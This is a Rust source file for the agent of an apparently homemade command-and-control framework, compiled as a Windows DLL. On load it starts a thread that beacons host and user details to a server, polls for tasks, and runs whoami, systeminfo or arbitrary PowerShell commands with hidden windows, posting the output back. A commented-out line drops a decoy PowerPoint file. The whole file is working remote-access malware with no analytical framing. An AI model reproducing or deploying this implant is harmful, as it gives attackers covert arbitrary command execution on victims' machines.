#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use chrono::prelude::*;
use names::Generator;
use reqwest::{Client, Error};
use serde::{Deserialize, Serialize};
use serde_json::{json, to_string};
use std::fs::File;
use std::io::Write;
use std::path::PathBuf;
use std::{
    os::windows::process::CommandExt,
    process::{self, Command},
};
use tokio::time::{Duration, sleep};
use uuid::Uuid;
use whoami::{self, fallible};

#[derive(Serialize, Deserialize, Clone)]
struct Info {
    uuid: Uuid,
    agent_id: String,
    hostname: String,
    username: String,
    pid: u32,
    os: String,
}
#[derive(Deserialize, Debug, Clone)]
struct Task {
    task_uuid: Uuid,
    task_type: String,
    task_params: Option<String>,
    task_output: Option<String>,
    task_status: Option<String>,
}
#[derive(Deserialize)]
struct Agent {
    info: Info,
    tasks: Vec<Task>,
}

#[unsafe(no_mangle)]
pub extern "stdcall" fn DllMain(
    hinst_dll: *mut u8,
    fdw_reason: u32,
    _lpv_reserved: *mut u8,
) -> i32 {
    match fdw_reason {
        1 => {
            // DLL_PROCESS_ATTACH
            std::thread::spawn(|| {
                let _ = run_agent();
            });
        }
        _ => {}
    }
    1 // TRUE
}

// #[tokio::main]
// async fn main() -> () {
//     let mut generator = Generator::default();
//     let url = "http://localhost:8000".to_string();
//     let uuid = Uuid::new_v4();
//     let agent_id = generator.next().unwrap();
//     let hostname = fallible::hostname().unwrap();
//     let username = whoami::username();
//     let pid = process::id();
//     let os = whoami::distro();
//     let curr_time: DateTime<Utc> = Utc::now();
//     let mut agent = Agent {
//         info: Info {
//             uuid: uuid,
//             agent_id: agent_id,
//             hostname: hostname,
//             username: username,
//             pid: pid,
//             os: os,
//         },
//         tasks: vec![],
//     };

//     // println!("[!] Running Agent!");
//     let _ = bacon(&url, &agent.info, curr_time).await;
//     // println!("[+] Should've gotten beacon!");

//     loop {
//         task::sleep(Duration::from_secs(5)).await;
//         let _ = fetch_tasks(&url, &agent.info.agent_id, &mut agent.tasks).await;
//     }
// }

// pub async fn download_and_save(url: &str, filename: &str) -> Result<(), Box<dyn std::error::Error>> {
//     let client = Client::new();
//     let response = client.get(url).send().await?;
//     let bytes = response.bytes().await?;

//     // Save to current directory
//     let mut path = PathBuf::from("..");
//     path.push(filename);

//     let mut file = File::create(&path)?;
//     file.write_all(&bytes)?;

//     Ok(())
// }

fn run_agent() -> Result<(), ()> {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        let mut generator = Generator::default();
        let url = "http://localhost".to_string();
        let uuid = Uuid::new_v4();
        let agent_id = generator.next().unwrap();
        let hostname = fallible::hostname().unwrap();
        let username = whoami::username();
        let pid = process::id();
        let os = whoami::distro();
        let curr_time: DateTime<Utc> = Utc::now();
        let mut agent = Agent {
            info: Info {
                uuid,
                agent_id,
                hostname,
                username,
                pid,
                os,
            },
            tasks: vec![],
        };

        let _ = bacon(&url, &agent.info, curr_time).await;
        // let _ = download_and_save("http://localhost/decoy.pptx", "annual_review_2026.pptx").await;
        loop {
            sleep(Duration::from_secs(5)).await;
            let _ = fetch_tasks(&url, &agent.info.agent_id, &mut agent.tasks).await;
        }
    });
    Ok(())
}

async fn fetch_tasks(
    url: &String,
    agent_id: &str,
    agent_tasks: &mut Vec<Task>,
) -> Result<(), Error> {
    let tasks_endpoint = url.to_owned() + "/task/" + agent_id;
    let response = reqwest::get(tasks_endpoint).await?;
    // println!("====");
    // println!("[+] Server is reachable: {}", response.status());
    // println!("\n:: Printing tasks for ({}) ::\n", agent_id);
    let tasks: Vec<Task> = response.json().await?;
    agent_tasks.extend(tasks.clone());
    for task in tasks {
        let _ = run_tasks(
            &url,
            &task.task_uuid,
            &task.task_type,
            &task.task_params,
            &agent_id,
        )
        .await;
        //         println!(
        //             "
        // Task ID: {}
        // Task Type: {}
        // Task Params: {:?}
        // Task Results: {:?}
        //         ",
        //             task.task_uuid,
        //             task.task_type,
        //             task.task_params.unwrap_or_default(),
        //             task.task_output.unwrap_or_default()
        //         );
    }
    // println!("====");

    Ok(())
}

// Implement sending results.
async fn run_tasks(
    url: &String,
    task_uuid: &Uuid,
    task_type: &String,
    task_params: &Option<String>,
    agent_id: &str,
) -> Result<(), Error> {
    let _ = task_params;
    let result_endpoint = url.to_owned() + "/result/" + agent_id;
    let types = ["sysinfo", "whoami", "download", "upload", "shell"].map(String::from);
    if types.contains(&task_type) {
        // println!("Valid task type [{}]", task_type);
        // println!("STR: {} / String: {}",task_type.as_str(), &task_type);
        match task_type.as_str() {
            "whoami" => {
                // println!("Running whoami");
                let output = String::from_utf8(
                    Command::new("whoami")
                        .creation_flags(0x08000000)
                        .output()
                        .unwrap()
                        .stdout,
                )
                .expect("Error.");
                // println!("{}",output);
                let output_body = json!({
                    "task_uuid": task_uuid.to_owned(),
                    "task_output": output.to_owned(),
                    "task_status": "complete"
                });
                // println!("[DEBUG]: {}",output_body);

                let _response = Client::new()
                    .post(result_endpoint)
                    .json(&output_body)
                    .send()
                    .await?;
                // println!("[DEBUG]: {:?}",response);
            }
            "sysinfo" => {
                // println!("Running sysinfo");
                let output = String::from_utf8(
                    Command::new("systeminfo")
                        .creation_flags(0x08000000)
                        .output()
                        .unwrap()
                        .stdout,
                )
                .expect("Error.");
                // println!("{}",output);
                let output_body = json!({
                    "task_uuid": task_uuid.to_owned(),
                    "task_output": output.to_owned(),
                    "task_status": "complete",

                });
                // println!("[DEBUG]: {}",output_body);

                let _response = Client::new()
                    .post(result_endpoint)
                    .json(&output_body)
                    .send()
                    .await?;
                // println!("[DEBUG]: {:?}",response);
            }
            "shell" => {
                // println!("Running shell");
                let command = task_params.clone().unwrap_or_default();
                let output = String::from_utf8(
                    Command::new("powershell")
                        .creation_flags(0x08000000)
                        .args(["-c", &command])
                        .output()
                        .unwrap()
                        .stdout,
                )
                .unwrap_or_default();
                // println!("{}",output);task_params
                let output_body = json!({
                    "task_uuid": task_uuid.to_owned(),
                    "task_output": output.to_owned(),
                    "task_status": "complete",

                });
                // println!("[DEBUG]: {}",output_body);

                let _response = Client::new()
                    .post(result_endpoint)
                    .json(&output_body)
                    .send()
                    .await?;
                // println!("[DEBUG]: {:?}",response);
            }
            _ => {
                // println!("Running wildcard");
                let output = "Wildcard".to_owned();
                let output_body = json!({
                    "task_uuid": task_uuid.to_owned(),
                    "task_output": output.to_owned(),
                    "task_status": "complete",
                });
                let _response = Client::new()
                    .post(result_endpoint)
                    .json(&output_body)
                    .send()
                    .await?;
            }
        }
    } else {
        // println!("Invalid task.")
    }
    Ok(())
}

async fn bacon(url: &String, info: &Info, curr_time: DateTime<Utc>) -> Result<(), Error> {
    let beacon_endpoint = url.to_owned() + "/beacon";
    let beacon_body = json!({
        "info": info,
        "last_seen": curr_time,
        "tasks": [],
    });

    let _response = Client::new()
        .post(beacon_endpoint)
        .json(&beacon_body)
        .send()
        .await?;

    // println!("[o] Agent ID: {}", info.agent_id);
    Ok(())
}
